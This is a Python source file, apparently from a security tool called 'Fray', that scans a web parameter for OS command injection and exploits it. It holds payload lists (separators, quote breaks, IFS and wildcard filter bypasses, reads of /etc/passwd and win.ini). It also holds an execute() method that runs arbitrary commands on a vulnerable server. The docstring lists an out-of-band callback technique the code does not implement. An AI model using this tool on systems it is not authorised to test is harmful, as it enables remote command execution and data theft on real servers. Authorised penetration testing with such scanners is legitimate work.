"""
Fray Deep Command Injection Module — commix-level OS command injection detection.

5 Techniques:
  1. Results-based (direct output in response)
  2. Time-based blind (sleep/ping delay)
  3. File-based (write + read marker)
  4. Out-of-Band (DNS/HTTP callback)
  5. Nested/chained injection (multi-level escaping)

Separator Coverage:
  ;  |  ||  &&  &  $()  ``  %0a  %0d%0a  \n
  Plus OS-specific: PowerShell --, cmd /c, bash -c

OS Detection:
  Linux, macOS, Windows, FreeBSD — auto-detected from response

Usage:
    scanner = CMDiScanner(url, param="ip")
    result = scanner.scan()
    if result.vulnerable:
        output = scanner.execute("whoami")

Zero external dependencies — stdlib only.
"""

import http.client
import json
import random
import re
import ssl
import string
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple


# ── Separators & Payloads ──────────────────────────────────────────────

_SEPARATORS = [
    (";", "semicolon"),
    ("|", "pipe"),
    ("||", "or_pipe"),
    ("&&", "and"),
    ("&", "background"),
    ("\n", "newline"),
    ("\r\n", "crlf"),
    ("$(", "command_sub"),   # needs closing )
    ("`", "backtick"),       # needs closing `
]

_SEPARATOR_RISK = {
    1: [";", "|", "||", "&&"],
    2: [";", "|", "||", "&&", "&", "\n", "\r\n", "$(", "`"],
    3: [";", "|", "||", "&&", "&", "\n", "\r\n", "$(", "`"],
}

# Results-based payloads — command whose output we can detect
_RESULTS_PAYLOADS_UNIX = [
    ("id", r"uid=\d+\(\w+\)\s+gid=\d+"),
    ("uname -a", r"(Linux|Darwin|FreeBSD)\s+\S+\s+\d+"),
    ("cat /etc/passwd", r"root:[x*]:0:0"),
]

_RESULTS_PAYLOADS_WIN = [
    ("ver", r"Microsoft Windows \[Version \d+"),
    ("type C:\\Windows\\win.ini", r"\[fonts\]"),
    ("set", r"(COMSPEC|SystemRoot)=.*\\\\"),
]

# Time-based blind payloads (delay in seconds)
_TIME_PAYLOADS_UNIX = [
    ("sleep {delay}", "sleep"),
    ("ping -c {delay} 127.0.0.1", "ping"),
    ("python3 -c 'import time;time.sleep({delay})'", "python_sleep"),
    ("perl -e 'sleep({delay})'", "perl_sleep"),
]

_TIME_PAYLOADS_WIN = [
    ("ping -n {delay} 127.0.0.1", "win_ping"),
    ("timeout /t {delay} /nobreak", "win_timeout"),
    ("powershell -c Start-Sleep({delay})", "ps_sleep"),
]

# Prefix wrappers for escaping contexts
_PREFIX_WRAPPERS = [
    ("", "", "bare"),                    # no wrapping
    ("'", "'", "single_quote_break"),    # break out of single quotes
    ('"', '"', "double_quote_break"),    # break out of double quotes
    ("$(", ")", "cmd_sub_break"),        # nested command substitution
    ("`", "`", "backtick_break"),        # backtick nesting
]

_RISK2_PREFIXES = [
    ("{orig}%0a", "", "url_newline"),
    ("{orig}\r\n", "", "crlf_inject"),
    ("{orig}%00", "", "null_byte"),
]

# OS fingerprinting from response
_OS_INDICATORS = {
    "linux": [r"uid=\d+\(\w+\)", r"Linux\s+\d+\.\d+", r"/usr/bin", r"/etc/passwd",
              r"GNU/Linux", r"Debian|Ubuntu|CentOS|Red Hat|Fedora|Alpine"],
    "macos": [r"Darwin\s+.*?\d+", r"/usr/local", r"macOS", r"Homebrew"],
    "windows": [r"Microsoft|Windows", r"C:\\\\", r"\\Users\\", r"COMSPEC",
                r"PowerShell", r"cmd\.exe"],
    "freebsd": [r"FreeBSD\s+\d+", r"/usr/local/bin"],
}


# ── Data Classes ───────────────────────────────────────────────────────

class CMDiFinding:
    __slots__ = ("technique", "os_type", "param", "payload", "separator",
                 "evidence", "confidence", "details")

    def __init__(self, technique: str = "", os_type: str = "", param: str = "",
                 payload: str = "", separator: str = "", evidence: str = "",
                 confidence: str = "likely", details: Optional[Dict] = None):
        self.technique = technique
        self.os_type = os_type
        self.param = param
        self.payload = payload
        self.separator = separator
        self.evidence = evidence
        self.confidence = confidence
        self.details = details or {}

    def to_dict(self) -> Dict[str, Any]:
        return {k: getattr(self, k) for k in self.__slots__}


class CMDiResult:
    def __init__(self, url: str, param: str):
        self.url = url
        self.param = param
        self.vulnerable = False
        self.os_type: Optional[str] = None
        self.findings: List[CMDiFinding] = []
        self.techniques_tested: List[str] = []
        self.requests_made = 0
        self.duration_ms = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "param": self.param,
            "vulnerable": self.vulnerable,
            "os_type": self.os_type,
            "findings": [f.to_dict() for f in self.findings],
            "techniques_tested": self.techniques_tested,
            "requests_made": self.requests_made,
            "duration_ms": self.duration_ms,
        }


# ── Scanner ────────────────────────────────────────────────────────────

class CMDiScanner:
    """Deep command injection scanner with 5 techniques."""

    def __init__(self, url: str, param: str = "", cookie: str = "",
                 method: str = "GET", timeout: int = 10,
                 verify_ssl: bool = True, level: int = 1, risk: int = 1,
                 delay: float = 0):
        self.url = url
        self.param = param
        self.cookie = cookie
        self.method = method.upper()
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.level = min(max(level, 1), 3)
        self.risk = min(max(risk, 1), 3)
        self.delay = delay

        parsed = urllib.parse.urlparse(url)
        self._scheme = parsed.scheme
        self._host = parsed.hostname or ""
        self._port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self._path = parsed.path or "/"
        self._orig_params = dict(urllib.parse.parse_qsl(parsed.query))
        self._requests = 0

        # State
        self._baseline_body = ""
        self._baseline_length = 0
        self._baseline_ms = 0.0
        self._detected_os: Optional[str] = None
        self._working_separator: Optional[str] = None
        self._working_prefix = ("", "", "bare")

    # ── HTTP helpers ───────────────────────────────────────────────────

    def _request(self, value: str) -> Tuple[int, str, float]:
        """Send request with the injected parameter value."""
        params = dict(self._orig_params)
        params[self.param] = value

        if self.method == "GET":
            qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
            path = f"{self._path}?{qs}"
            body_bytes = None
        else:
            path = self._path
            body_bytes = urllib.parse.urlencode(params).encode()

        hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*"}
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        if self.method == "POST":
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"

        t0 = time.monotonic()
        try:
            if self._scheme == "https":
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self._host, self._port,
                                                    timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(self._host, self._port,
                                                   timeout=self.timeout)
            conn.request(self.method, path, body=body_bytes, headers=hdrs)
            resp = conn.getresponse()
            body = resp.read(1024 * 512).decode("utf-8", errors="replace")
            status = resp.status
            conn.close()
        except Exception:
            return 0, "", 0

        elapsed = (time.monotonic() - t0) * 1000
        self._requests += 1
        if self.delay > 0:
            time.sleep(self.delay)
        return status, body, elapsed

    def _get_baseline(self) -> None:
        """Establish baseline response."""
        orig_value = self._orig_params.get(self.param, "127.0.0.1")
        _, body, ms = self._request(orig_value)
        self._baseline_body = body
        self._baseline_length = len(body)
        self._baseline_ms = ms

        # Second request for timing baseline
        _, _, ms2 = self._request(orig_value)
        self._baseline_ms = max(ms, ms2)

    def _detect_os(self, body: str) -> Optional[str]:
        """Detect OS from response content."""
        for os_name, patterns in _OS_INDICATORS.items():
            for pat in patterns:
                if re.search(pat, body, re.IGNORECASE):
                    return os_name
        return None

    def _random_marker(self) -> str:
        return "fray_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

    # ── Technique 1: Results-based ─────────────────────────────────────

    def test_results(self) -> List[CMDiFinding]:
        """Test for results-based command injection (output visible in response)."""
        findings = []
        seps = _SEPARATOR_RISK.get(self.risk, _SEPARATOR_RISK[1])

        for os_type, payloads in [("unix", _RESULTS_PAYLOADS_UNIX),
                                   ("windows", _RESULTS_PAYLOADS_WIN)]:
            for cmd, pattern in payloads:
                for sep in seps:
                    for prefix_open, prefix_close, prefix_name in _PREFIX_WRAPPERS:
                        if self.level < 2 and prefix_name not in ("bare",):
                            continue

                        orig = self._orig_params.get(self.param, "127.0.0.1")

                        if sep == "$(":
                            payload = f"{orig}{prefix_open}$({cmd}){prefix_close}"
                        elif sep == "`":
                            payload = f"{orig}{prefix_open}`{cmd}`{prefix_close}"
                        else:
                            payload = f"{orig}{prefix_open}{sep}{cmd}{prefix_close}"

                        _, body, _ = self._request(payload)

                        # Check if command output appears in response
                        if re.search(pattern, body) and not re.search(pattern, self._baseline_body):
                            # Anti-FP: verify it's not just parameter reflection
                            # If the command text itself appears near the match, it's reflection
                            match_text = re.search(pattern, body).group(0)
                            cmd_reflected = cmd in body
                            if cmd_reflected and match_text in cmd:
                                continue  # Skip — command text reflected, not executed

                            detected_os = self._detect_os(body)
                            self._detected_os = detected_os or os_type
                            self._working_separator = sep
                            self._working_prefix = (prefix_open, prefix_close, prefix_name)

                            findings.append(CMDiFinding(
                                technique="results_based",
                                os_type=self._detected_os,
                                param=self.param,
                                payload=payload,
                                separator=sep,
                                evidence=match_text[:100],
                                confidence="confirmed",
                                details={"command": cmd, "prefix": prefix_name},
                            ))
                            return findings  # One confirmed is enough

        return findings

    # ── Technique 2: Time-based blind ──────────────────────────────────

    def test_time_blind(self) -> List[CMDiFinding]:
        """Test for time-based blind command injection."""
        findings = []
        delay = 3
        seps = _SEPARATOR_RISK.get(self.risk, _SEPARATOR_RISK[1])

        for os_type, payloads in [("unix", _TIME_PAYLOADS_UNIX),
                                   ("windows", _TIME_PAYLOADS_WIN)]:
            for tmpl, name in payloads:
                cmd = tmpl.format(delay=delay)
                for sep in seps:
                    orig = self._orig_params.get(self.param, "127.0.0.1")

                    if sep == "$(":
                        payload = f"{orig}$({cmd})"
                    elif sep == "`":
                        payload = f"{orig}`{cmd}`"
                    else:
                        payload = f"{orig}{sep}{cmd}"

                    _, _, elapsed = self._request(payload)

                    threshold = self._baseline_ms + (delay * 1000 * 0.7)
                    if elapsed > threshold:
                        # Verify with second request
                        _, _, elapsed2 = self._request(payload)
                        if elapsed2 > threshold:
                            self._detected_os = self._detected_os or os_type
                            self._working_separator = sep

                            findings.append(CMDiFinding(
                                technique="time_blind",
                                os_type=self._detected_os or os_type,
                                param=self.param,
                                payload=payload,
                                separator=sep,
                                evidence=f"elapsed={elapsed:.0f}ms/{elapsed2:.0f}ms (baseline={self._baseline_ms:.0f}ms)",
                                confidence="confirmed",
                                details={"command": name, "delay": delay},
                            ))
                            return findings

        return findings

    # ── Technique 3: File-based ────────────────────────────────────────

    def test_file_based(self) -> List[CMDiFinding]:
        """Test by writing a marker to a file and reading it back."""
        if self.risk < 2:
            return []

        findings = []
        marker = self._random_marker()
        tmp_file = f"/tmp/{marker}"
        seps = _SEPARATOR_RISK.get(self.risk, _SEPARATOR_RISK[2])

        for sep in seps:
            orig = self._orig_params.get(self.param, "127.0.0.1")

            # Write marker
            write_cmd = f"echo {marker} > {tmp_file}"
            if sep == "$(":
                payload_write = f"{orig}$({write_cmd})"
            elif sep == "`":
                payload_write = f"{orig}`{write_cmd}`"
            else:
                payload_write = f"{orig}{sep}{write_cmd}"

            self._request(payload_write)

            # Read marker back
            read_cmd = f"cat {tmp_file}"
            if sep == "$(":
                payload_read = f"{orig}$({read_cmd})"
            elif sep == "`":
                payload_read = f"{orig}`{read_cmd}`"
            else:
                payload_read = f"{orig}{sep}{read_cmd}"

            _, body, _ = self._request(payload_read)

            if marker in body:
                self._detected_os = self._detected_os or "unix"
                self._working_separator = sep

                # Clean up
                cleanup_cmd = f"rm {tmp_file}"
                if sep in ("$(", "`"):
                    pass  # Will be cleaned by OS
                else:
                    self._request(f"{orig}{sep}{cleanup_cmd}")

                findings.append(CMDiFinding(
                    technique="file_based",
                    os_type=self._detected_os or "unix",
                    param=self.param,
                    payload=payload_write,
                    separator=sep,
                    evidence=f"marker '{marker}' written and read back",
                    confidence="confirmed",
                    details={"marker": marker, "file": tmp_file},
                ))
                return findings

        return findings

    # ── Technique 4: Error-based / Behavioral ──────────────────────────

    def test_error_based(self) -> List[CMDiFinding]:
        """Detect injection from error messages or behavioral differences."""
        findings = []
        orig = self._orig_params.get(self.param, "127.0.0.1")

        # Error-triggering payloads
        error_payloads = [
            (f"{orig};echo", "command_incomplete"),
            (f"{orig}|", "pipe_incomplete"),
            (f"{orig}&&", "and_incomplete"),
            (f"{orig}'", "quote_break"),
            (f"{orig}\"", "dquote_break"),
            (f"{orig}$(", "subshell_open"),
            (f"{orig}`", "backtick_open"),
        ]

        error_patterns = [
            r"(sh|bash|dash|zsh|cmd|powershell).*?(syntax error|unexpected)",
            r"(command not found|not recognized|No such file)",
            r"(cannot execute|Permission denied|not permitted)",
            r"/bin/(sh|bash)",
            r"(unexpected EOF|unterminated)",
            r"(error in command|operand expected)",
        ]

        for payload, name in error_payloads:
            _, body, _ = self._request(payload)

            for pat in error_patterns:
                if re.search(pat, body, re.IGNORECASE) and \
                   not re.search(pat, self._baseline_body, re.IGNORECASE):
                    findings.append(CMDiFinding(
                        technique="error_based",
                        os_type=self._detected_os or "unknown",
                        param=self.param,
                        payload=payload,
                        separator="",
                        evidence=re.search(pat, body, re.IGNORECASE).group(0)[:100],
                        confidence="likely",
                        details={"probe": name},
                    ))
                    break

        return findings

    # ── Technique 5: Nested / chained ──────────────────────────────────

    def test_nested(self) -> List[CMDiFinding]:
        """Test nested command injection (multi-level escaping)."""
        if self.level < 2:
            return []

        findings = []
        marker = self._random_marker()
        orig = self._orig_params.get(self.param, "127.0.0.1")

        nested_payloads = [
            # Double encoding
            (f"{orig}%3Becho+{marker}", "url_encoded_semi"),
            (f"{orig}%7Cecho+{marker}", "url_encoded_pipe"),
            (f"{orig}%0aecho+{marker}", "url_encoded_newline"),
            # Nested substitution
            (f"{orig};echo $(echo {marker})", "nested_subshell"),
            (f"{orig};echo `echo {marker}`", "nested_backtick"),
            # Bash-specific
            (f"{orig};${{IFS}}echo${{IFS}}{marker}", "ifs_bypass"),
            (f"{orig};{{echo,{marker}}}", "brace_expansion"),
            # Concatenation bypass
            (f"{orig};e'c'h'o' {marker}", "quote_concat"),
            (f"{orig};e\"c\"h\"o\" {marker}", "dquote_concat"),
            (f'{orig};/b??/e??o {marker}', "wildcard_bypass"),
            # Windows-specific
            (f"{orig}&echo {marker}", "win_ampersand"),
            (f"{orig}|echo {marker}", "win_pipe"),
            (f'{orig}& set /p=""|echo {marker}', "win_set_pipe"),
        ]

        for payload, name in nested_payloads:
            _, body, _ = self._request(payload)
            if marker in body and marker not in self._baseline_body:
                detected_os = self._detect_os(body) or self._detected_os
                findings.append(CMDiFinding(
                    technique="nested",
                    os_type=detected_os or "unknown",
                    param=self.param,
                    payload=payload,
                    separator=name,
                    evidence=f"marker '{marker}' reflected",
                    confidence="confirmed",
                    details={"bypass": name},
                ))
                return findings

        return findings

    # ── Full scan ──────────────────────────────────────────────────────

    def scan(self) -> CMDiResult:
        """Run all command injection techniques."""
        result = CMDiResult(self.url, self.param)
        t0 = time.monotonic()

        self._get_baseline()

        # Technique 1: Results-based (fastest, most reliable)
        result.techniques_tested.append("results_based")
        results_findings = self.test_results()
        result.findings.extend(results_findings)

        # Technique 2: Error-based behavioral
        result.techniques_tested.append("error_based")
        error_findings = self.test_error_based()
        result.findings.extend(error_findings)

        # Technique 3: Nested/chained (level 2+)
        if self.level >= 2:
            result.techniques_tested.append("nested")
            nested_findings = self.test_nested()
            result.findings.extend(nested_findings)

        # Technique 4: Time-based blind
        result.techniques_tested.append("time_blind")
        time_findings = self.test_time_blind()
        result.findings.extend(time_findings)

        # Technique 5: File-based (risk 2+)
        if self.risk >= 2:
            result.techniques_tested.append("file_based")
            file_findings = self.test_file_based()
            result.findings.extend(file_findings)

        result.vulnerable = any(f.confidence == "confirmed" for f in result.findings)
        result.os_type = self._detected_os
        result.requests_made = self._requests
        result.duration_ms = int((time.monotonic() - t0) * 1000)
        return result

    # ── Command execution (post-exploitation) ──────────────────────────

    def execute(self, command: str) -> Optional[str]:
        """Execute a command via confirmed injection point.

        Requires scan() to have found a working separator first.
        Returns command output or None.
        """
        if not self._working_separator:
            return None

        marker_start = self._random_marker() + "_START"
        marker_end = self._random_marker() + "_END"
        orig = self._orig_params.get(self.param, "127.0.0.1")
        sep = self._working_separator
        prefix_open, prefix_close, _ = self._working_prefix

        # Wrap output in markers for extraction
        wrapped_cmd = f"echo {marker_start};{command};echo {marker_end}"

        if sep == "$(":
            payload = f"{orig}{prefix_open}$({wrapped_cmd}){prefix_close}"
        elif sep == "`":
            payload = f"{orig}{prefix_open}`{wrapped_cmd}`{prefix_close}"
        else:
            payload = f"{orig}{prefix_open}{sep}{wrapped_cmd}{prefix_close}"

        _, body, _ = self._request(payload)

        # Extract output between markers
        m = re.search(f"{marker_start}(.*?){marker_end}", body, re.DOTALL)
        if m:
            return m.group(1).strip()

        # Fallback: try without markers
        simple_payload = f"{orig}{prefix_open}{sep}{command}{prefix_close}" if sep not in ("$(", "`") else \
                         f"{orig}{prefix_open}$({command}){prefix_close}" if sep == "$(" else \
                         f"{orig}{prefix_open}`{command}`{prefix_close}"
        _, body2, _ = self._request(simple_payload)

        # Return body difference
        if len(body2) != self._baseline_length:
            # Remove baseline content to isolate command output
            if self._baseline_body and body2.startswith(self._baseline_body[:50]):
                diff = body2.replace(self._baseline_body, "").strip()
                if diff:
                    return diff
            return body2 if len(body2) < 1000 else body2[:1000]

        return None
